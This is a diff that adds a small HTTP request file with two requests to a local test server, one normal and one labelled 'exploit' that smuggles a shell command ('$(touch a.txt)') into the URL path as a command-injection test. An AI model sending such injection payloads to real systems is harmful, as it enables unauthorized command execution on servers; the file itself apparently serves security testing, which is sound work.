@@ -1,0 +1,6 @@
+# normal
+GET http://localhost:3000/test006/jane HTTP/1.1
+
+###
+# exploit
+GET http://localhost:3000/test006/jane$(touch a.txt) HTTP/1.1
